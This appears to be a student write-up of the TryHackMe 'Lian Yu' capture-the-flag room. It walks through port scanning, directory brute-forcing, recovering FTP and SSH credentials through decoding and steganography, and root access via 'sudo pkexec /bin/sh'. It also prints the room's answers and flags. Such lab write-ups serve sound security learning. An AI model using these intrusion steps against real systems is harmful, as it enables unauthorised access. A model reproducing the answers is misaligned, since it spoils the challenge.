# WEEK 6 - LIAN YU (TRYHACKME)

Room link : https://tryhackme.com/room/lianyu


# 1. Scanning the IP
  
  ```bash
  nmap -sC -sV -T4 10.49.141.87 
```
  
  <img width="983" height="677" alt="8a115fa7-53b5-45c4-8115-e9927e74d345" src="https://github.com/user-attachments/assets/3ff9cfda-5c53-4de3-9673-a361d46f4f06" />


```bash
Ports found ---
port 21/tcp - FTP - (vsftpd 3.0.2)
port 22/tcp - SSH - (OpenSSH 6.7p1)
port 80/tcp - HTTP - (Apache httpd)
port 111/tcp - RPC - (rpcbind) 
```

# 2. Enumeration

```bash
Visit the IP 
```
<img width="1600" height="826" alt="bda28505-a273-4b9e-b18d-579e0a539008" src="https://github.com/user-attachments/assets/ed86e344-97e6-475a-b33e-213194b287de" />

  ```bash
Now run gobuster for hidden Directories.
```
```bash
gobuster dir -u http://10.10.228.22/ -w/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
 <img width="852" height="315" alt="3f2c4d63-4da3-4c50-aabf-cc6c00ad9c53" src="https://github.com/user-attachments/assets/89c71447-f21a-48df-8090-2c967c050ae6" />

```bash
Found a directory : /island
```
```bash
Now go to the browser and serarch http://10.10.228.22/island
```

<img width="1600" height="824" alt="3ce9a2b7-f7b5-49a1-89f8-e3ab1652815f" src="https://github.com/user-attachments/assets/a588e17c-90ca-4f61-bba4-b5551a57747a" />


<img width="1600" height="823" alt="312848e3-0cca-42e6-aa0c-a1e8d82b1045" src="https://github.com/user-attachments/assets/4988223d-aa3a-4bb0-bd2f-2b6641a4f5a3" />


```bash
Found out the Code Word by highlighting the page text or viewing the page source.
Code Word -  'vigilante' - (this is our FTP username)
```

```bash
Again run gobuster on /island directory to discover a different directory.
```
```bash
gobuster dir -u http://10.10.228.22/island -w/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

```bash
Here we found another directory : /2100 -- 
```

```bash
Now doing the same again go to the browser and serarch http://10.10.228.22/island/2100
```
<img width="1600" height="823" alt="1fcadfe5-d6d5-4233-801f-e6431ffe60b6" src="https://github.com/user-attachments/assets/35ac2b0b-3cd0-4e2f-9d22-837695831509" />


```bash
View the page source -- 
```
<img width="1600" height="825" alt="0503f025-f5af-42ea-885d-0fb1c3246203" src="https://github.com/user-attachments/assets/07b91ba3-4b5d-4d1f-9d71-dea97ed63002" />


```bash
Here it says there is a file with a '.ticket' extension.
```
```bash
Now again run gobuster to look for files with a '.ticket' extension.
```
```bash
gobuster dir --url 10.10.228.22/island/2100 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket 

```bash
Found another director : /green_arrow.ticket -- (what is the file name you found?)
```
```bash 
Again going to the browser search http://10.10.228.22/island/2100/green_arrow.ticket.
```
<img width="1022" height="720" alt="89b79708-a2e9-4119-92fa-a017e0b1dd42" src="https://github.com/user-attachments/assets/18d28705-3474-4ce4-bf3d-b3f70f7b81a3" />


```bash
Seems we found an encryption : 'RTy8yhBQdscX' .  So now lets try to decode it ---

Go to https://gchq.github.io/CyberChef/

Use 'FromBase58' to decode it.
```
![hash](https://user-images.githubusercontent.com/119054834/204713677-f62752e5-e6f0-4133-a829-2134dac5a3b2.png)

```bash
Seems like we have cracked it : '!#th3h00d' - This is the FTP Password. -- (what is the FTP Password?)
```

# 3. Now the FTP Login

```bash
Now as we have the username and passowrd ---
Username - vigilante
password - !#th3h00d

We can log in to the FTP service - 
```
<img width="1022" height="720" alt="89b79708-a2e9-4119-92fa-a017e0b1dd42" src="https://github.com/user-attachments/assets/14ee82c9-2799-4f24-8c9d-44e28fecfd3c" />


```bash
We got two users: 'vigilante' and 'slade' .
Also found 3 image files in the server. Download them in you system --- Follow the down commands to download the files -- 
```
<img width="1600" height="822" alt="b266cd7a-f6bc-4763-bc94-8c208d925561" src="https://github.com/user-attachments/assets/5be00aa5-0fcb-417c-8df4-ce223cb0110a" />


```bash
Now view the image files and we see that 'Leave.me.alone.png' is not opening.
Also the exiftool shows 'File Format error'
```
<img width="1600" height="827" alt="82a1d43a-c3d7-4ca0-a404-3984a43dfa04" src="https://github.com/user-attachments/assets/49a2fe3e-3d42-4960-baf9-84fd16835bb1" />

<img width="1006" height="511" alt="d30d6b54-ec8f-48eb-9d7f-372b33f3005a" src="https://github.com/user-attachments/assets/70de1a1f-9b09-4fe1-8b1a-90c06f65a693" />


```bash
Checking the header file of the image we found that it is actually wrong there.
```
<img width="513" height="196" alt="d7c9a715-d8d1-4d78-9cda-c6746d06a446" src="https://github.com/user-attachments/assets/5ea5decc-7861-4d44-980d-5ec3a60ceabb" />


```bash
The correct header -- https://en.wikipedia.org/wiki/Portable_Network_Graphics
```
![correct](https://user-images.githubusercontent.com/119054834/204731135-e25be51b-ff4f-4182-839e-b00d892480e6.png)

```bash
Now lets change it -- 
```
<img width="508" height="197" alt="55cd648f-b871-4212-a1ac-63a6e8bf1c53" src="https://github.com/user-attachments/assets/70d6227b-bf47-4a23-854c-124efdbc1c84" />


```bash
Now you can open the image file Here you got a password : 'password' 
```
<img width="1600" height="798" alt="8f41c647-21ab-4659-8dc1-01b4f4f0be84" src="https://github.com/user-attachments/assets/9f7603eb-ab4b-4b9e-8ddb-74391b696c07" />


```bash
Now lets use steghide to extract any hidden files within the other image files.
```
```bash
steghide extract -sf aa.jpg
```
![extr](https://user-images.githubusercontent.com/119054834/204743926-86e6f2ee-527f-4f6c-8cf9-33bb466b4d12.png)

```bash
Now using the password 'password' we got earlier successfully extracted the .jpg file to a ss.zip file. 
We found a  a 'passwd.txt' and a 'shado file' unzipping the ss.zip file. 
```
<img width="612" height="443" alt="3e14b23d-07ee-400a-b7c3-65e242e65576" src="https://github.com/user-attachments/assets/6e962541-6ede-4a22-b3f2-98047174c9f3" />



```bash
Now cat 'shado' file and you get a password : 'M3tahuman' -- (ssh password) --- (what is the file name with SSH password?)
```
<img width="520" height="153" alt="ce3e8fe0-1a9f-478b-b01a-6228728b8ce2" src="https://github.com/user-attachments/assets/c7f83cf1-e8c0-4138-9f3b-8040f058a292" />


# 4. SSH Login

```bash
Now as we have got the ssh password we can now login -- 
User - slade 
password - M3tahuman
```
```bash
ssh slade@10.10.228.22   
```
<img width="650" height="475" alt="42bc9cb2-e2a7-4528-9603-da8e99c6c0dc" src="https://github.com/user-attachments/assets/d50adcdf-383a-447c-8375-abc2e2791440" />


```bash
Now that you're logged in search the user.txt flag --
```
```bash
slade@LianYu:~$ ls
user.txt
```
 <img width="403" height="126" alt="ccc95292-953e-4049-af97-6a30b322198f" src="https://github.com/user-attachments/assets/9621ffd5-3689-433c-ade7-de151a904c8d" />


```bash
user.txt - 'THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}'
```

# 5. Root Privilege Escalation

```bash
To find which commands we can run with root privileges we can run: ---
```
```bash
sudo -l
```
<img width="887" height="146" alt="069b39a4-7225-4cb8-8d7b-44ab65b13481" src="https://github.com/user-attachments/assets/6d8c8a93-e8f4-414c-8236-ead3eb322958" />


```bash
After running sudo -l , it will again ask for slade password -- use the same password - 'M3tahuman'.


Now You see it says we can run the 'pkexec' with root privileges ---- So now we can run run '/bin/sh' program as root & get the root access.
```
```bash
sudo pkexec /bin/sh
```
<img width="767" height="343" alt="51f6adad-4a7c-4795-bc00-1b2a1192e476" src="https://github.com/user-attachments/assets/ab17314c-64c1-416e-b2cd-2e4e0fbf9b8f" />


```bash
root.txt - 'THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}'
```
flag : THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
